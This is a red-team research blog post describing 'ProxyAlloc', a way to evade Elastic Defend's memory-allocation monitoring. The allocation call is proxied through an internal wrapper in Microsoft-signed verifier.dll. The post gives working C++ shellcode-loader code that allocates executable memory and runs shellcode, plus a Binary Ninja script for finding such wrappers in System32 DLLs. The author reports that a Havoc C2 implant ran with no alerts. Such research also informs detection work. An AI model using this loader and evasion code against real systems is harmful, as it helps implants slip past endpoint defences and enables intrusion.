# https://blog.cryptoplague.net/main/research/windows-research/proxyalloc-evading-ntallocatevirtualmemory-detection-ft.-elastic-defend-and-binary-ninja

**Preface**

Not long ago, one of my standard in-process shellcode execution methods for the Red Team engagements I have worked on looked similar to this:

Copy

```
DWORD protect{};
LPVOID virtualMemory = nullptr;
SIZE_T size = rawShellcodeLength;

this->api.NtAllocateVirtualMemory.call
(
    NtCurrentProcess(), &virtualMemory, 0, &size,
    MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
);

this->api.RtlMoveMemory.call(virtualMemory, rawShellcode, rawShellcodeLength);

(*(int(*)()) virtualMemory)();
```

This method has variations, such as using additional `NtProtectVirtualMemory` calls to avoid allocating memory with `RWX` protections. Most of them should look familiar to you and usually take the following form:

PAGE\_NOACCESS -> PAGE\_READWRITE -> PAGE\_EXECUTE\_READ
PAGE\_READWRITE -> PAGE\_EXECUTE\_READ
PAGE\_READWRITE -> PAGE\_EXECUTE

This is a well-known technique, but it is not often detected in a corporate environment where business processes prevail over security considerations (and usually, rightly so).

I was, however, surprised, when I tried to launch my implant in a new lab that has Elastic stack configured, with Elastic Defend as an agent and the most aggressive detection methods turned on.

**Detection**

Right when the implant was launched, I observed the following:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FTWhI9IA20pNEgQZ91HqF%252Fimage.png%3Falt%3Dmedia%26token%3D21322873-ecf8-4f20-ad05-cf0dfd236ad2&width=768&dpr=3&quality=100&sign=fe235c8e&sv=2)

When I looked into the specifics of that detection, it became obvious that `NtAllocateVirtualMemory` / `NtProtectVirtualMemory` calls are being monitored:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FKpdUWbvQQdmAlRyrvlrN%252Fimage.png%3Falt%3Dmedia%26token%3D4396a508-6587-454d-a9b0-63a5dd5ef0d4&width=768&dpr=3&quality=100&sign=ee09cb08&sv=2)

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252Ff9Yet2EWOJNIwAOCBCWB%252Fimage.png%3Falt%3Dmedia%26token%3D4e63d69d-540d-4f68-9c04-27a6300ae619&width=768&dpr=3&quality=100&sign=3745e330&sv=2)

After thinking about it for some time and related evasion discussions with [@zimnyaaarrow-up-right](https://twitter.com/zimnyaatishina) (I suggest checking his blog at [tishina.inarrow-up-right](https://tishina.in/)), an idea came to my mind.

Let us review the call stack when the `NtAllocateVirtualMemory` call happens:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252F4hu6Ne4PuSg52ujsfvJe%252Fimage.png%3Falt%3Dmedia%26token%3D18c77907-4c9b-4006-9e6b-10e03b2828f4&width=768&dpr=3&quality=100&sign=b954feba&sv=2)

Essentially, the call stack relevant to our objective at this point can be translated to the following:

unsigned\_binary -> signed\_ntdll\_ZwAllocateVirtualMemory

What if we could place some signed module in between, to pretend that we are not directly calling `NtAllocateVirtualMemory`? It appears that we can.

**Discovery**

Multiple Microsoft-signed DLLs are present at `C:\Windows\System32\*`.

I decided to utilize [Binary Ninjaarrow-up-right](https://binary.ninja/) with its awesome Python [APIarrow-up-right](https://docs.binary.ninja/dev) to scan every signed DLL there for functions that might serve as a wrapper for `NtAllocateVirtualMemory`.

The high-level overview of the search algorithm for any DLL is as follows:

1. Check if `NtAllocateVirtualMemory` is imported by our target.

2. If imported, check all its call sites for two separate special cases below.

3. Mark the location if `Protect` and `RegionSize` arguments can be supplied through the caller function's parameters.

4. Mark the location if `RWX` memory of more than `64KB` is allocated.


The script is as follows and could be improved to account for more valid cases:

Copy

```
import os
import binaryninja
from binaryninja import highlevelil

# File with all signed dll paths in C:\Windows\System32\*
signed_dlls_path = r'C:\Users\user\source\repos\SignedDllAnalyzer\signed_dlls.txt'

# Counting how many dlls are to be processed
with open(signed_dlls_path, "r") as f:
    signed_dlls = [dll.strip() for dll in f]

total_dlls = len(signed_dlls)

with open(signed_dlls_path, "r") as f:
	current_dll = 0
	# Processing each dll
	for signed_dll_path in f:
		current_dll += 1
		# Preparing variables for the progress bar
		signed_dll_path = signed_dll_path.strip()
		dll_name = signed_dll_path.split('\\')[-1]
		dll_size_mb = os.path.getsize(signed_dll_path) / 1024 / 1024
		progress = f"{current_dll}/{total_dlls}"
		# We don't want to process dlls with size more than 15 MB
		if dll_size_mb > 15:
			print(f"[-] [{progress}] [{dll_name}] [{dll_size_mb:.2f} > 15 MB]")
			continue
		# Update progress bar
		print(f"[*] [{progress}] [{dll_name}] [{dll_size_mb:.2f} MB]")
		# Open the dll in Binary Ninja without advanced analysis
		with binaryninja.load(signed_dll_path, update_analysis=False) as binary_view:
			# Check if NtAllocateVirtualMemory is imported by the dll
			ntAllocateVirtualMemorySymbol = binary_view.get_symbol_by_raw_name("NtAllocateVirtualMemory")
			# If it is not imported, we skip to the next dll
			if not ntAllocateVirtualMemorySymbol:
				continue
			else:
				# If it is imported, update progress and perform dll analysis
				print(f"[+] [{progress}] [{dll_name}] [NtAllocateVirtualMemory]")
				binary_view.set_analysis_hold(False)
				binary_view.update_analysis_and_wait()
				# Get all code references of the NtAllocateVirtualMemory call and process each one
				code_refs = binary_view.get_code_refs(ntAllocateVirtualMemorySymbol.address)
				for ref in code_refs:
					try:
						# Get the function which contains target code reference
						func = binary_view.get_functions_containing(ref.address)[0]
						# Get the HLIL (High Level IL) representation of the call site
						hlil_instr = func.get_llil_at(ref.address).hlil
						# Specifically look for the NtAllocateVirtualMemory call
						for operand in hlil_instr.operands:
							if type(operand) == HighLevelILCall:
								if operand.dest.value.value == ntAllocateVirtualMemorySymbol.address:
									hlil_call = operand
									break
						# Process arguments of the NtAllocateVirtualMemory call (specifically Protect and RegionSize)
						args = hlil_call.params
						protect = args[5]
						regionSize = args[3]
						# More cases could be added here (for example, variable SSA form analysis)
						# Case 1: arguments are directly supplied from wrapper function parameters
						if type(protect) == HighLevelILVar:
							if protect.var not in func.parameter_vars:
								continue
						if type(regionSize) == HighLevelILVar:
							if regionSize.var not in func.parameter_vars:
								continue
						# Case 2: arguments are constant
						if type(protect) == HighLevelILConst:
							if int(protect.value) != 0x40: # looking for RWX
								continue
						if type(regionSize) == HighLevelILConst:
							if int(regionSize.value) <= 0x10000: # looking for more than 64 KB
								continue
						# If reached here, update the progress to sumbit finding for manual analysis
						print(f"[+] [{progress}] [{dll_name}] [{hex(ref.address)}] [{hlil_instr}]")
					except Exception as e:
						print(f"[x] [{progress}] [{dll_name}] [{e}]")
```

After running the script, we can observe multiple findings:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FlT2J5CHhifFlcbb9DZwQ%252Fimage.png%3Falt%3Dmedia%26token%3Dbed53af9-3bea-47e3-b4f2-e2ac57c0401b&width=768&dpr=3&quality=100&sign=2b4e5bdf&sv=2)

For example, both of those functions are essentially wrappers around `NtAllocateVirtualMemory`:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FHSy6TsgiSnv0mbcyDEG3%252Fimage.png%3Falt%3Dmedia%26token%3Dd4212bf8-4b1b-4a99-98e3-5fa93457db34&width=768&dpr=3&quality=100&sign=f887a963&sv=2)

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252F56E1smxW5eSzMhOPH591%252Fimage.png%3Falt%3Dmedia%26token%3D0c0a67d2-8030-40bf-be64-8e23013f4449&width=768&dpr=3&quality=100&sign=9aa930e8&sv=2)

Curious readers might ask, if we consider calling them instead of `NtAllocateVirtualMemory`, how is this different from calling `kernel32.VirtualAlloc`?

Two main differences that are relevant for us:

1. `VirtualAlloc` is monitored by security solutions even more than `NtAllocateVirtualMemory`.

2. It is an exported API function, while both functions above are internal for `verifier.dll`.


Other than that, yes, it is very similar to `VirtualAlloc`, which itself is a wrapper around `NtAllocateVirtualMemory`:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FtcqXRGYxFmhOUGwnkVeK%252Fimage.png%3Falt%3Dmedia%26token%3D3bf08eaf-2c46-4050-9622-80d5a96793fb&width=768&dpr=3&quality=100&sign=383af71a&sv=2)

**The technique itself: ProxyAlloc**

I decided to call this method **ProxyAlloc**, as we are proxying our actual call to `NtAllocateVirtualMemory` through any Microsoft-signed DLL that has an internal wrapper around it.

The code for this technique is as follows (example with `verifier.AVrfpNtAllocateVirtualMemory`):

Copy

```
typedef NTSTATUS (*AVrfpNtAllocateVirtualMemory_t)
(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    ULONG_PTR *RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

DWORD protect{};
LPVOID virtualMemory = nullptr;
SIZE_T size = rawShellcodeLength;

HMODULE hVerifierMod = this->api.LoadLibraryA.call("verifier.dll");

AVrfpNtAllocateVirtualMemory_t AVrfpNtAllocateVirtualMemory = (AVrfpNtAllocateVirtualMemory_t)((char*)hVerifierMod + 0x25110);
AVrfpNtAllocateVirtualMemory(NtCurrentProcess(), &virtualMemory, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

this->api.RtlMoveMemory.call(virtualMemory, rawShellcode, rawShellcodeLength);

(*(int(*)()) virtualMemory)();
```

It also could be improved, for example, by using pattern scanning instead of plain offsets.

The call stack observed after using this method is:

![](https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FPuOhSu4X4h1c621vxH41%252Fimage.png%3Falt%3Dmedia%26token%3Dd825ee19-7d35-400a-a38e-7863e4498ddc&width=768&dpr=3&quality=100&sign=de3261f9&sv=2)

Which roughly equals to the following scheme, as expected:

unsigned\_binary -> signed\_dll\_offset -> signed\_ntdll\_ZwAllocateVirtualMemory

**Final Test**

After testing this with an actual loader and modified [Havocarrow-up-right](https://github.com/HavocFramework/Havoc) (Demon agent shellcode) as our C2 of choice, Elastic Defend did not generate any alerts.

[PreviousThe dusk of g\_CiOptions: circumventing DSE with VBS enabledchevron-left](https://blog.cryptoplague.net/main/research/windows-research/the-dusk-of-g_cioptions-circumventing-dse-with-vbs-enabled) [NextOffset-free DSE bypass across Windows 11 & 10: utilising ntkrnlmp.pdbchevron-right](https://blog.cryptoplague.net/main/research/windows-research/offset-free-dse-bypass-across-windows-11-and-10-utilising-ntkrnlmp.pdb)

Last updated 1 year ago